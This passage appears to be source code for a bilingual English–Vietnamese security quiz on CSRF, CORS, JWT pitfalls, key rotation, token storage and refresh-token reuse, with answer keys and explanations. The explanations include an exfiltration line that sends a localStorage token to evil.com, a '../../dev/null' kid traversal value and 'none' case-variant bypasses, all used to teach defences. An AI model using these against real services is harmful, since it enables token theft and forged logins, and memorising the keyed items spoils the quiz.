              'CORS governs who may READ a response; a form POST is a simple request that skips preflight entirely, so the state change happens before CORS is consulted. Against a same-site subdomain, <code>SameSite</code> does nothing, and what covers it is a <code>Sec-Fetch-Site</code> check that also refuses <code>same-site</code>, or a CSRF token bound by HMAC to the session id',
              'CORS quản việc ai được ĐỌC phản hồi; một form POST là một request đơn giản, bỏ qua hoàn toàn bước tiền kiểm, nên việc thay đổi trạng thái đã xong trước khi CORS được hỏi tới. Với một tên miền con cùng site, <code>SameSite</code> không làm gì cả, và thứ phủ được nó là một phép kiểm <code>Sec-Fetch-Site</code> từ chối luôn cả <code>same-site</code>, hoặc một token CSRF buộc vào id phiên bằng HMAC',
            ),
            B(
              'CORS only applies to requests made by <code>fetch</code> and <code>XMLHttpRequest</code>, so it is bypassed by using an <code>img</code> tag; the covering defence is to reject every state-changing GET',
              'CORS chỉ áp cho những request tạo bởi <code>fetch</code> và <code>XMLHttpRequest</code>, nên nó bị vòng qua bằng một thẻ <code>img</code>; biện pháp phủ được là từ chối mọi GET có thay đổi trạng thái',
            ),
            B(
              'CORS is enforced by the server rather than the browser, so an attacker\'s own HTTP client ignores it; the covering defence is to require a custom header on every request',
              'CORS do máy chủ áp chứ không phải trình duyệt, nên HTTP client của kẻ tấn công cứ thế phớt lờ; biện pháp phủ được là bắt buộc một header tuỳ chỉnh trên mọi request',
            ),
          ],
          correct: 1,
          explanation: EX(
            '"We have CORS configured" is the most common wrong answer to CSRF, and the reason is a category error: CORS decides whether the attacker\'s <em>script may read your response</em>, and CSRF does not need the response. A plain HTML form can send exactly three content types — <code>application/x-www-form-urlencoded</code>, <code>multipart/form-data</code> and <code>text/plain</code> — all of which are simple requests with no preflight, so the browser sends the request, your server changes the email address, and only then does the browser decline to hand the response back. The damage is in the request. On the subdomain question, note the vocabulary trap: <code>app.example.com</code> and <code>blog.example.com</code> are the <em>same site</em> and different origins, so <code>SameSite</code> is silent between them. A <code>Sec-Fetch-Site</code> middleware that allows only <code>same-origin</code> and <code>none</code> covers it, and the header is a forbidden header name so no script can set it. Option 4 gets the enforcement point backwards, which matters: an attacker\'s own curl is not a CSRF attack at all, because it carries none of the victim\'s cookies. And if you do use double-submit tokens, sign them — an unsigned pair is forged by any subdomain that can set cookies.',
            '"Bọn tôi cấu hình CORS rồi" là câu trả lời sai hay gặp nhất cho CSRF, và lý do là một lỗi nhầm phạm trù: CORS quyết định việc SCRIPT của kẻ tấn công CÓ ĐƯỢC ĐỌC PHẢN HỒI của bạn hay không, mà CSRF thì không cần phản hồi. Một form HTML thuần gửi được đúng ba kiểu nội dung — <code>application/x-www-form-urlencoded</code>, <code>multipart/form-data</code> và <code>text/plain</code> — cả ba đều là request đơn giản, không có tiền kiểm, nên trình duyệt gửi request đi, máy chủ của bạn đổi địa chỉ email, RỒI trình duyệt mới từ chối trao lại phản hồi. Thiệt hại nằm ở cái request. Về câu hỏi tên miền con, để ý cái bẫy từ vựng: <code>app.example.com</code> và <code>blog.example.com</code> là CÙNG MỘT SITE và là hai origin khác nhau, nên <code>SameSite</code> câm lặng giữa chúng. Một middleware <code>Sec-Fetch-Site</code> chỉ cho qua <code>same-origin</code> và <code>none</code> thì phủ được, và header đó thuộc nhóm tên header bị cấm nên không script nào đặt được. Phương án 4 hiểu ngược chỗ áp đặt, mà chỗ đó quan trọng: một lệnh curl của chính kẻ tấn công không phải một cú CSRF, vì nó chẳng mang theo cookie nào của nạn nhân. Còn nếu bạn dùng token gửi kèm hai lần thì hãy KÝ nó — một cặp không ký sẽ bị bất kỳ tên miền con nào đặt được cookie giả mạo ra.',
          ),
        }),

        /* ── Chương 4 — mổ JWT từ bên trong (5 câu) ────────────────────── */

        // q16 · đáp án 2
        mcq({
          prompt: B(
            'A colleague proposes putting a user\'s phone number and internal customer id into the JWT payload, arguing that the token is signed and therefore protected. What is wrong, and what does the signature actually guarantee?',
            'Một đồng nghiệp đề xuất nhét số điện thoại và mã khách hàng nội bộ của người dùng vào phần payload của JWT, lập luận rằng token đã được ký nên đã được bảo vệ. Sai ở đâu, và chữ ký thật ra bảo đảm điều gì?',
          ),
          options: [
            B(
              'Nothing is wrong as long as the algorithm is asymmetric, because only the holder of the private key can decode a token signed with it',
              'Không có gì sai miễn là thuật toán bất đối xứng, vì chỉ người giữ khoá riêng mới giải mã được một token ký bằng nó',
            ),
            B(
              'The problem is only size: extra claims push the token past the 4 KB cookie limit, and the signature does guarantee confidentiality against anyone but the issuer',
              'Vấn đề chỉ là kích thước: các claim thêm vào đẩy token vượt giới hạn 4 KB của cookie, còn chữ ký thì đúng là bảo đảm tính bí mật trước mọi người trừ bên phát hành',
            ),
            B(
              'The payload is base64url, which is an encoding rather than encryption, so anyone holding the token reads every claim with one shell command; the signature guarantees only that the bytes were not altered since someone with the key produced them',
              'Phần payload là base64url, một cách MÃ HOÁ HIỂN THỊ chứ không phải mã hoá bảo mật, nên ai cầm token cũng đọc được mọi claim bằng một câu lệnh shell; chữ ký chỉ bảo đảm rằng dãy byte không bị sửa kể từ lúc ai đó có khoá tạo ra nó',
            ),
            B(
              'The payload is safe but the header is not, so sensitive values must be moved out of the header into the payload where the signature covers them',
              'Phần payload thì an toàn còn header thì không, nên các giá trị nhạy cảm phải chuyển từ header vào payload, nơi chữ ký phủ tới',
            ),
          ],
          correct: 2,
          explanation: EX(
            'A JWS is three base64url strings joined by dots, and two of them are readable JSON. No key is needed, no library is needed: <code>cut -d. -f2</code> and a base64url decode is the whole attack, and it works on the user\'s own machine, in a proxy log, in a crash report and in whatever chat message the token was pasted into. Signing is about <em>integrity and origin</em>: it proves the bytes have not changed since someone holding the key produced them, and nothing more. It is not confidentiality — that is JWE, five parts instead of three, and the usual right answer is simpler: put nothing private in a token at all. Option 1 reverses how asymmetric signing works, since the public key is public exactly so that other parties can verify. Option 2 names a real constraint — past roughly 4 KB a cookie stops being set at all, silently — but attaches it to the wrong conclusion. Option 4 invents a distinction; the signature covers both header and payload, and covering something is not hiding it.',
            'Một JWS là ba chuỗi base64url nối nhau bằng dấu chấm, và hai trong ba là JSON đọc được. Không cần khoá, không cần thư viện: <code>cut -d. -f2</code> rồi giải mã base64url là trọn cú tấn công, và nó chạy được ngay trên máy của người dùng, trong log của proxy, trong một báo cáo sự cố, và trong bất cứ tin nhắn nào cái token bị dán vào. Việc ký nói về TÍNH TOÀN VẸN VÀ NGUỒN GỐC: nó chứng minh dãy byte không đổi kể từ lúc ai đó cầm khoá tạo ra nó, và không gì hơn. Nó không phải tính bí mật — thứ đó là JWE, năm phần thay vì ba, và câu trả lời đúng thường thấy còn đơn giản hơn: đừng đặt bất cứ thứ gì riêng tư vào token. Phương án 1 nói ngược cách ký bất đối xứng hoạt động, vì khoá công khai công khai chính là để bên khác kiểm được. Phương án 2 gọi tên một ràng buộc có thật — vượt khoảng 4 KB thì cookie thôi được đặt hẳn, trong im lặng — nhưng gắn nó vào một kết luận sai. Phương án 4 bịa ra một sự phân biệt; chữ ký phủ cả header lẫn payload, và phủ lên một thứ không có nghĩa là che nó đi.',
          ),
        }),

        // q17 · đáp án 0
        mcq({
          prompt: B(
            'Three different JWT attacks — a header saying ' + c('alg: "none"') + ', a header saying ' + c('HS256') + ' on a service that issues RS256, and a header carrying ' + c('jku') + ' pointing at the attacker\'s key set — share one root cause. What is it, and what single configuration removes all three?',
            'Ba cú tấn công JWT khác nhau — một header ghi ' + c('alg: "none"') + ', một header ghi ' + c('HS256') + ' gửi tới dịch vụ vốn phát hành RS256, và một header mang ' + c('jku') + ' trỏ vào bộ khoá của kẻ tấn công — có chung một gốc rễ. Gốc đó là gì, và MỘT thiết lập nào gỡ bỏ cả ba?',
          ),
          options: [
            B(
              'The token is being allowed to choose how it is verified. Name the accepted algorithm in your own configuration as an allowlist with exactly one entry, ignore <code>jku</code>, <code>jwk</code> and <code>x5u</code> entirely, and select the key yourself',
              'Cái token đang được phép TỰ CHỌN cách nó bị kiểm. Hãy nêu thuật toán được chấp nhận trong cấu hình của chính bạn, dưới dạng một danh sách trắng đúng một phần tử, phớt lờ hoàn toàn <code>jku</code>, <code>jwk</code> và <code>x5u</code>, và tự bạn chọn khoá',
            ),
            B(
              'The signing key is too short in all three cases. A 256-bit key from a CSPRNG makes each of these forgeries computationally infeasible without any code change',
              'Cả ba trường hợp đều do khoá ký quá ngắn. Một khoá 256 bit sinh từ CSPRNG khiến từng cú giả mạo trên trở nên bất khả thi về mặt tính toán mà không cần sửa mã',
            ),
            B(
              'The header is not covered by the signature, which is a known weakness of the compact serialization; move the algorithm into the payload so the signature protects it',
              'Header không được chữ ký phủ tới, đó là một điểm yếu đã biết của dạng tuần tự hoá compact; hãy chuyển thuật toán vào payload để chữ ký bảo vệ nó',
            ),
            B(
              'The library is parsing the token before validating it. Parsing the payload only after the claims have been checked removes all three, because the header is never read',
              'Thư viện đang phân tích token trước khi kiểm nó. Chỉ phân tích payload SAU khi các claim đã được kiểm là gỡ bỏ cả ba, vì header không bao giờ được đọc tới',
            ),
          ],
          correct: 0,
          explanation: EX(
            'All three attacks are the same sentence: the verifier asked the token how to check the token. <code>alg: "none"</code> asks for no signature at all — and note that a denylist on the string <code>none</code> has been bypassed with <code>None</code> and <code>nOnE</code>, so the defence must be an allowlist. Algorithm confusion asks the verifier to treat a published public key as an HMAC secret, which works because that key is genuinely public. <code>jku</code> asks it to fetch a key set from a URL the attacker controls. One line answers all of them: state the accepted algorithm up front, as a list with exactly one entry, and look the key up yourself. Two footnotes. First, <code>algorithms: [\'RS256\', \'HS256\']</code> reopens the second attack completely — during a migration, distinguish keys by <code>kid</code> and derive the algorithm from the key you selected. Second, <code>kid</code> is a lookup parameter and therefore attacker input: <code>kid: "../../dev/null"</code> against a file-based store yields an empty key, and HMAC with an empty key is a signature anyone can compute. Option 3 is factually wrong — the signature covers <code>header.payload</code>, which is why the header cannot be edited without breaking it, and yet a header that <em>selects the verification method</em> is dangerous anyway.',
            'Cả ba cú tấn công là cùng một câu: bộ kiểm đã hỏi chính cái token xem phải kiểm cái token thế nào. <code>alg: "none"</code> xin không có chữ ký nào cả — và nhớ rằng một danh sách đen chặn chuỗi <code>none</code> từng bị vòng qua bằng <code>None</code> và <code>nOnE</code>, nên phòng thủ phải là danh sách TRẮNG. Lẫn lộn thuật toán xin bộ kiểm coi một khoá công khai đã công bố như một bí mật HMAC, và nó ăn vì cái khoá ấy công khai thật. <code>jku</code> xin nó đi lấy một bộ khoá từ một URL kẻ tấn công điều khiển. Một dòng trả lời cả ba: nêu trước thuật toán được chấp nhận, dưới dạng một danh sách đúng một phần tử, và tự mình tra khoá. Hai chú thích. Một, <code>algorithms: [\'RS256\', \'HS256\']</code> mở lại hoàn toàn cú tấn công thứ hai — trong lúc chuyển đổi, hãy phân biệt khoá bằng <code>kid</code> và suy ra thuật toán TỪ CÁI KHOÁ bạn đã chọn. Hai, <code>kid</code> là một tham số tra cứu nên nó là đầu vào của kẻ tấn công: <code>kid: "../../dev/null"</code> với một kho khoá dạng file cho ra một khoá RỖNG, và HMAC với khoá rỗng là một chữ ký ai cũng tính được. Phương án 3 sai về mặt sự thật — chữ ký phủ <code>header.payload</code>, và chính vì thế header không thể bị sửa mà chữ ký còn nguyên, nhưng một header ĐƯỢC QUYỀN CHỌN CÁCH KIỂM thì vẫn nguy hiểm bất kể điều đó.',
          ),
        }),

        // q18 · đáp án 3
        mcq({
          prompt: B(
            'A service signs tokens with ' + c('const claims = { sub: u.id, exp: Date.now() + 15 * 60 * 1000 };') + ' and every test passes. What is wrong, and why did nothing catch it?',
            'Một dịch vụ ký token bằng ' + c('const claims = { sub: u.id, exp: Date.now() + 15 * 60 * 1000 };') + ' và mọi phép kiểm đều qua. Sai ở đâu, và vì sao không có gì bắt được nó?',
          ),
          options: [
            B(
              'The expiry is fifteen minutes too short, since <code>Date.now()</code> is evaluated at module load rather than at signing time, so every token expires fifteen minutes after the process started',
              'Hạn ngắn hơn mười lăm phút, vì <code>Date.now()</code> được tính lúc nạp module chứ không phải lúc ký, nên mọi token hết hạn mười lăm phút sau khi tiến trình khởi động',
            ),
            B(
              'The claim name is wrong: the registered claim is <code>expires</code>, and verifiers silently ignore an unknown <code>exp</code>, so the token never expires',
              'Sai tên claim: claim đã đăng ký là <code>expires</code>, và các bộ kiểm lặng lẽ bỏ qua một <code>exp</code> lạ, nên token không bao giờ hết hạn',
            ),
            B(
              'Nothing is wrong with the arithmetic, but the claim must be a string in ISO 8601 format, and a numeric value causes strict verifiers to reject the token outright',
              'Phép tính không sai, nhưng claim này phải là một chuỗi theo định dạng ISO 8601, và một giá trị số làm các bộ kiểm nghiêm ngặt từ chối thẳng cái token',
            ),
            B(
              '<code>exp</code> is counted in seconds since the epoch while <code>Date.now()</code> returns milliseconds, so the token is valid for tens of thousands of years; every test passes because a token that never expires behaves correctly in every test that does not wait',
              '<code>exp</code> đếm bằng GIÂY từ mốc epoch trong khi <code>Date.now()</code> trả về MILI-GIÂY, nên token có hiệu lực hàng chục nghìn năm; mọi phép kiểm đều qua vì một token không bao giờ hết hạn thì hành xử đúng trong mọi phép kiểm không có bước chờ',
            ),
          ],
          correct: 3,
          explanation: EX(
            'The registered time claims are all "seconds since the epoch", and JavaScript\'s clock is the one common language whose native unit is milliseconds. Multiplying a millisecond timestamp by roughly a thousand pushes the expiry into the far future — run it and you will see a year in the tens of thousands. This is the most common JWT bug in JavaScript codebases and it is completely silent: the signature is valid, the claim is present, the verifier is happy, and every test passes because none of them waits fifteen minutes. What you have shipped is a bearer credential that never expires, on a system whose only revocation mechanism was expiry. The fix is not to write the arithmetic more carefully; it is to stop writing it. Let the library take a duration — <code>.setExpirationTime(\'15m\')</code> — so the unit is never yours to get wrong. And when debugging, convert <code>exp</code> to an ISO string before arguing about it, because a ten-digit number and a thirteen-digit number look identical at a glance. Options 1, 2 and 3 each invent a mechanism: <code>Date.now()</code> is evaluated where it is written, <code>exp</code> is the registered name, and a NumericDate is required to be numeric.',
            'Các claim thời gian đã đăng ký đều tính bằng "số GIÂY kể từ mốc epoch", còn đồng hồ của JavaScript lại là cái duy nhất trong các ngôn ngữ phổ biến có đơn vị gốc là MILI-GIÂY. Nhân một dấu thời gian mili-giây lên khoảng một nghìn lần sẽ đẩy hạn dùng ra tương lai xa — chạy thử là thấy một con số năm nằm ở hàng chục nghìn. Đây là lỗi JWT hay gặp nhất trong các kho mã JavaScript và nó hoàn toàn câm lặng: chữ ký hợp lệ, claim có mặt, bộ kiểm hài lòng, và mọi phép kiểm đều qua vì chẳng phép nào chờ mười lăm phút. Thứ bạn vừa phát hành là một tín vật mang theo KHÔNG BAO GIỜ HẾT HẠN, trên một hệ mà cơ chế thu hồi duy nhất là hết hạn. Cách sửa không phải là viết phép tính cẩn thận hơn; mà là thôi viết nó. Hãy để thư viện nhận một khoảng thời lượng — <code>.setExpirationTime(\'15m\')</code> — để đơn vị không còn là thứ bạn có cơ hội làm sai. Và lúc gỡ lỗi, hãy đổi <code>exp</code> sang chuỗi ISO trước khi tranh luận, vì một số mười chữ số và một số mười ba chữ số nhìn thoáng qua giống hệt nhau. Phương án 1, 2 và 3 mỗi cái bịa một cơ chế: <code>Date.now()</code> được tính ngay tại chỗ nó được viết, <code>exp</code> đúng là tên đã đăng ký, và một NumericDate bắt buộc phải là số.',
          ),
        }),

        // q19 · đáp án 1
        mcq({
          prompt: B(
            'You are rotating the key that signs fifteen-minute access tokens, published through a JWKS document that verifiers cache for ten minutes. What is the correct order, and what happens if you get it wrong?',
            'Bạn đang xoay cái khoá ký cho các access token mười lăm phút, công bố qua một tài liệu JWKS mà các bên kiểm cache trong mười phút. Thứ tự đúng là gì, và làm sai thì chuyện gì xảy ra?',
          ),
          options: [
            B(
              'Switch signing to the new key, then publish it, then wait one cache lifetime, then retire the old one — publishing first would let a verifier accept tokens the issuer has not signed yet',
              'Chuyển sang KÝ bằng khoá mới, rồi công bố nó, rồi chờ hết một vòng cache, rồi rút khoá cũ — công bố trước sẽ khiến một bên kiểm chấp nhận những token mà bên phát hành chưa ký',
            ),
            B(
              'Publish the new key first and keep signing with the old one, wait until every verifier has refreshed its cache, then switch signing, then retire the old key after the longest-lived token it signed has expired',
              'Công bố khoá mới trước và vẫn KÝ bằng khoá cũ, chờ cho mọi bên kiểm làm mới xong cache, rồi mới chuyển sang ký bằng khoá mới, rồi rút khoá cũ sau khi cái token sống lâu nhất do nó ký đã hết hạn',
            ),
            B(
              'Publish and switch signing in the same deploy, then retire the old key immediately, since the <code>kid</code> in each token tells the verifier which key to use and no waiting is required',
              'Công bố và chuyển ký trong cùng một lần deploy, rồi rút khoá cũ ngay, vì <code>kid</code> trong mỗi token đã nói cho bên kiểm biết dùng khoá nào và không cần chờ đợi gì',
            ),
            B(
              'Retire the old key first so no token signed with it can still be accepted, then publish and switch in one step, which guarantees a clean cutover with no overlap window',
              'Rút khoá cũ trước để không token nào ký bằng nó còn được chấp nhận, rồi công bố và chuyển sang khoá mới trong một bước, cách này bảo đảm một lần cắt sạch sẽ không có cửa sổ chồng lấn',
            ),
          ],
          correct: 1,
          explanation: EX(
            'Four words in one order: <b>publish, sign, wait, retire.</b> Publishing first means every verifier learns the new key while it is still verifying tokens signed by the old one, which costs nothing and breaks nothing. Only once the cache has certainly turned over do you switch which key signs. Then you wait out the longest-lived artefact that key ever signed before removing it. Both ways of getting the order wrong produce the identical symptom — a valid token rejected — and both are outages. Signing before publishing means live tokens carry a <code>kid</code> no verifier knows, and during a rolling deploy the failure is intermittent: half your requests fail, and which half depends on which instance answered. Retiring early is the same outage arriving from the other end. Two traps worth carrying away. First, "deployed" and "everywhere" are different moments, so the wait after publishing is real. Second, the overlap is bounded by the longest-lived thing the key signs, and people forget one: the same key often signs email verification links valid for twenty-four hours, password reset links and signed download URLs, and those reports arrive as unrelated bug tickets the next day. Option 3 misreads what <code>kid</code> does — it names a key, it does not deliver one — and an unknown <code>kid</code> must be a rejection, never a fallback to a default key.',
            'Bốn chữ theo đúng một thứ tự: <b>công bố, ký, chờ, rút.</b> Công bố trước nghĩa là mọi bên kiểm học được khoá mới trong khi vẫn đang kiểm những token ký bằng khoá cũ, việc đó không tốn gì và không làm hỏng gì. Chỉ khi cache chắc chắn đã lật vòng thì mới đổi khoá nào đứng ra ký. Rồi chờ hết cái hiện vật sống lâu nhất mà khoá đó từng ký, xong mới gỡ nó. Cả hai kiểu làm sai thứ tự đều sinh ra đúng một triệu chứng — một token hợp lệ bị từ chối — và cả hai đều là sự cố. Ký trước khi công bố nghĩa là các token đang sống mang một <code>kid</code> không bên kiểm nào biết, và trong một lượt deploy cuốn chiếu thì lỗi chập chờn: một nửa số request hỏng, và hỏng nửa nào thì tuỳ instance nào trả lời. Rút sớm là đúng sự cố đó đi tới từ đầu bên kia. Hai cái bẫy đáng mang về. Một, "đã deploy" và "đã ở khắp nơi" là hai thời điểm khác nhau, nên bước chờ sau khi công bố là có thật. Hai, khoảng chồng lấn bị chặn bởi cái thứ sống lâu nhất mà khoá đó ký, và người ta hay quên một cái: cùng khoá đó thường ký cả các đường dẫn xác minh email có hạn hai mươi tư giờ, các đường dẫn đặt lại mật khẩu và các URL tải file đã ký, rồi hôm sau những báo cáo ấy về dưới dạng các phiếu lỗi trông chẳng liên quan gì nhau. Phương án 3 hiểu sai việc của <code>kid</code> — nó GỌI TÊN một khoá chứ không GIAO một khoá — và một <code>kid</code> lạ phải là một lời từ chối, không bao giờ được lùi về một khoá mặc định.',
          ),
        }),

        // q20 · đáp án 2
        mcq({
          prompt: B(
            'An XSS bug fires on a page. Compare what the attacker gets when the access token is in ' + c('localStorage') + ' against what they get when it is in an ' + c('HttpOnly') + ' cookie.',
            'Một lỗ hổng XSS bùng lên trên một trang. Hãy so sánh thứ kẻ tấn công lấy được khi access token nằm trong ' + c('localStorage') + ' với thứ chúng lấy được khi nó nằm trong một cookie ' + c('HttpOnly') + '.',
          ),
          options: [
            B(
              'Both are equally compromised, since a script that runs on your page can read any storage the page can read, and the <code>HttpOnly</code> flag is advisory rather than enforced',
              'Cả hai đều bị chiếm như nhau, vì một script chạy trên trang của bạn đọc được mọi kho lưu trữ mà trang đó đọc được, và cờ <code>HttpOnly</code> chỉ mang tính khuyến nghị chứ không được cưỡng chế',
            ),
            B(
              'The cookie is worse: it is attached automatically to every request, so the attacker does not even need to write code, whereas reading <code>localStorage</code> requires the page to still be open',
              'Cookie tệ hơn: nó tự động được đính vào mọi request, nên kẻ tấn công thậm chí không cần viết mã, trong khi đọc <code>localStorage</code> thì đòi trang phải còn mở',
            ),
            B(
              'From <code>localStorage</code> the token is exfiltrated and usable from the attacker\'s own machine until it expires; behind <code>HttpOnly</code> nothing leaves, and the attacker can only act through the victim\'s browser while the page is open',
              'Từ <code>localStorage</code> thì token bị mang đi và dùng được từ chính máy của kẻ tấn công cho tới khi nó hết hạn; sau <code>HttpOnly</code> thì không gì rời đi được, và kẻ tấn công chỉ hành động được qua trình duyệt nạn nhân trong lúc trang còn mở',
            ),
            B(
              'The <code>HttpOnly</code> cookie is fully safe, because the browser refuses to attach it to any request initiated by JavaScript, so an XSS payload cannot make authenticated calls at all',
              'Cookie <code>HttpOnly</code> thì an toàn hoàn toàn, vì trình duyệt từ chối đính nó vào bất kỳ request nào do JavaScript khởi tạo, nên một mã độc XSS không gọi được lời gọi có xác thực nào',
            ),
          ],
          correct: 2,
          explanation: EX(
            'The difference is real and it is narrower than people usually claim in either direction. With the token in <code>localStorage</code>, one line — <code>fetch(\'https://evil.com/?t=\' + localStorage.getItem(\'accessToken\'))</code> — hands the attacker a credential they can use from anywhere, at their leisure, for as long as it lives. Behind <code>HttpOnly</code>, that line returns nothing. What remains possible is that the script calls your API <em>from the victim\'s browser</em> with <code>credentials: \'include\'</code> and changes the email address, so <code>HttpOnly</code> turns permanent account takeover into a session-length problem. That is a large improvement and it is not a fix for XSS. Option 4 overstates it in exactly that way: cookies are attached to same-origin <code>fetch</code> calls, which is the whole point of them. Option 1 understates it — <code>HttpOnly</code> is enforced by the browser, not advised. Option 2 mistakes automatic attachment for a weakness, which is a CSRF concern answered by <code>SameSite</code> plus an origin check, and trading a solved problem for an unsolved one is the wrong trade.',
            'Khác biệt là có thật và nó hẹp hơn cái người ta thường tuyên bố theo cả hai chiều. Với token nằm trong <code>localStorage</code>, một dòng — <code>fetch(\'https://evil.com/?t=\' + localStorage.getItem(\'accessToken\'))</code> — trao cho kẻ tấn công một tín vật mà chúng dùng được từ bất cứ đâu, lúc nào rảnh cũng được, suốt vòng đời của nó. Sau <code>HttpOnly</code> thì dòng đó trả về rỗng. Thứ vẫn còn làm được là script gọi API của bạn TỪ TRÌNH DUYỆT CỦA NẠN NHÂN với <code>credentials: \'include\'</code> rồi đổi địa chỉ email, nên <code>HttpOnly</code> biến một vụ chiếm tài khoản vĩnh viễn thành một bài toán dài bằng một phiên. Đó là một cải thiện lớn và nó không phải cách chữa XSS. Phương án 4 nói quá đúng theo kiểu ấy: cookie VẪN được đính vào các lời gọi <code>fetch</code> cùng origin, đó chính là công dụng của chúng. Phương án 1 nói thiếu — <code>HttpOnly</code> do trình duyệt cưỡng chế chứ không phải khuyến nghị. Phương án 2 nhầm việc tự động đính kèm thành một điểm yếu, đó là mối lo CSRF đã được <code>SameSite</code> cộng một phép kiểm nguồn trả lời, và đánh đổi một bài toán đã giải lấy một bài toán chưa giải là một cuộc đổi chác sai.',
          ),
        }),

        /* ── Chương 5 — refresh, xoay vòng, thu hồi (4 câu) ─────────────── */

        // q21 · đáp án 3
        mcq({
          prompt: B(
            'A team replaces its database-backed session with a fifteen-minute JWT plus a thirty-day refresh token. Which number are they actually choosing when they pick fifteen minutes?',
            'Một nhóm thay phiên lưu trong cơ sở dữ liệu bằng một JWT mười lăm phút cộng một refresh token ba mươi ngày. Khi chọn con số mười lăm phút, thật ra họ đang chọn cái gì?',
          ),
          options: [
            B(
              'How often a user has to sign in again, since the refresh token only extends the session and cannot renew it once the access token has lapsed',
              'Bao lâu người dùng phải đăng nhập lại một lần, vì refresh token chỉ kéo dài phiên chứ không làm mới được nữa một khi access token đã hết hiệu lực',
            ),
            B(
              'How much database load the design removes, since the refresh endpoint performs one lookup and the access token performs none',
              'Thiết kế này gỡ được bao nhiêu tải cho cơ sở dữ liệu, vì endpoint refresh làm một lượt tra còn access token thì không tra lần nào',
            ),
            B(
              'How long a stolen refresh token stays useful, since a thief who holds one can keep minting access tokens for exactly that long before rotation catches them',
              'Một refresh token bị trộm còn dùng được bao lâu, vì kẻ trộm cầm nó cứ đúc access token thêm đúng chừng ấy thời gian trước khi việc xoay vòng bắt được',
            ),
            B(
              'The revocation window: signing out, locking an account or removing a role takes effect on the request path only when the current access token expires, so fifteen minutes is how long a revoked user keeps working',
              'Cửa sổ thu hồi: đăng xuất, khoá tài khoản hay gỡ một vai trò chỉ có hiệu lực trên đường request khi access token hiện tại hết hạn, nên mười lăm phút chính là khoảng thời gian một người đã bị thu hồi vẫn còn làm việc được',
            ),
          ],
          correct: 3,
          explanation: EX(
            'The pair exists because one credential cannot do both jobs. Verifying a signature needs no lookup, which is what makes an access token cheap on every request; ending a session immediately needs a lookup, which is what makes a refresh token a row in a table. Splitting them buys both — at the cost of a gap. Revoking the refresh row stops the next renewal, and it does nothing at all to the access token already in the client\'s memory, which stays valid until <code>exp</code>. So the number is a policy decision about how long "we signed you out" is allowed to be untrue: five minutes for banking, fifteen for most products, an hour for a mobile app where the battery cost of refreshing matters. Under five minutes is usually not worth it. Option 2 names a real benefit that is not what the number controls. Option 3 has the direction backwards — the refresh token\'s own lifetime and rotation govern that. And note the trap this design invites: a fifteen-minute access token <em>without</em> rotation on refresh is a thirty-day credential with extra steps.',
            'Cặp token này tồn tại vì một tín vật không làm nổi cả hai việc. Kiểm một chữ ký thì không cần tra cứu, và đó là thứ khiến access token rẻ trên mọi request; chấm dứt một phiên ngay lập tức thì cần tra cứu, và đó là thứ khiến refresh token là một dòng trong bảng. Tách đôi ra thì được cả hai — với cái giá là một khoảng hở. Thu hồi dòng refresh chặn được lượt gia hạn kế tiếp, và nó không đụng gì tới cái access token đã nằm trong bộ nhớ của client, thứ vẫn hợp lệ tới tận <code>exp</code>. Nên con số đó là một quyết định chính sách về việc câu "chúng tôi đã đăng xuất bạn" được phép sai trong bao lâu: năm phút cho ngân hàng, mười lăm cho phần lớn sản phẩm, một giờ cho app di động nơi cái giá pin của việc làm mới là đáng kể. Dưới năm phút thường không đáng. Phương án 2 gọi tên một lợi ích có thật nhưng đó không phải thứ con số này điều khiển. Phương án 3 nói ngược chiều — vòng đời của chính refresh token và việc xoay vòng mới chi phối điều đó. Và để ý cái bẫy mà thiết kế này mời gọi: một access token mười lăm phút mà KHÔNG xoay vòng khi refresh thì là một tín vật ba mươi ngày kèm thêm vài bước thừa.',
          ),
        }),

        // q22 · đáp án 1
        mcq({
          prompt: B(
            'A refresh token that was already exchanged thirty minutes ago is presented again. What should happen, and why is the narrower response wrong?',
            'Một refresh token đã được đổi cách đây ba mươi phút lại được đưa lên lần nữa. Chuyện gì nên xảy ra, và vì sao phản ứng hẹp hơn lại sai?',
          ),
          options: [
            B(
              'Reject that one token and let the family continue, because revoking more than was presented punishes a user whose client merely retried an old request',
              'Từ chối riêng cái token đó và để cả họ chạy tiếp, vì thu hồi nhiều hơn thứ vừa được đưa lên là trừng phạt một người dùng mà client của họ chỉ thử lại một request cũ',
            ),
            B(
              'Revoke the whole token family, because two parties hold that token and you cannot tell which is the thief; revoking only the presented one leaves whichever of them it was still holding a working successor',
              'Thu hồi cả họ token, vì có HAI bên đang cầm cái token đó và bạn không phân biệt được ai là kẻ trộm; thu hồi mỗi cái vừa đưa lên thì bên nào đó trong hai bên vẫn còn cầm một cái kế nhiệm chạy được',
            ),
            B(
              'Lock the account and require a password reset, since a replay this far outside the grace window is proof of compromise and a session-level response is too weak',
              'Khoá tài khoản và bắt đặt lại mật khẩu, vì một lượt phát lại cách xa cửa sổ ân hạn tới vậy là bằng chứng bị xâm nhập và một phản ứng ở mức phiên là quá nhẹ',
            ),
            B(
              'Issue a fresh token and log a warning, because refusing it breaks mobile clients whose response was lost and would generate more support load than the attack costs',
              'Cấp một token mới và ghi một dòng cảnh báo, vì từ chối nó sẽ làm hỏng các client di động bị mất phản hồi và sẽ sinh ra nhiều việc hỗ trợ hơn cái giá của cú tấn công',
            ),
          ],
          correct: 1,
          explanation: EX(
            'Rotation makes every refresh token single use, so a used token appearing again means a copy exists. The crucial part is that you cannot tell which of the two holders is the legitimate one: if the victim refreshed first, the thief is presenting the stale token; if the thief refreshed first, the victim is. Revoking only the token that was presented therefore gets it right half the time and hands the thief a working session the other half. Revoking the family is correct in both, and it has a property worth appreciating — when the thief wins the race, they are locked out by the <em>victim\'s</em> next refresh, without anybody noticing anything was wrong. Option 3 goes one step too far in a way that creates a denial of service: anyone who steals or replays a refresh token could then lock the owner out on purpose. The right shape is to end the sessions, tell the user honestly what happened, and invite them to sign in again. Option 4 abandons the mechanism, and note that its concern is real but belongs to a narrow grace window measured in seconds — thirty minutes is far outside it. Build it in the safe order: rotation first, then the client fix for the refresh race, then reuse detection with the log line before the revocation so you can watch it for a week.',
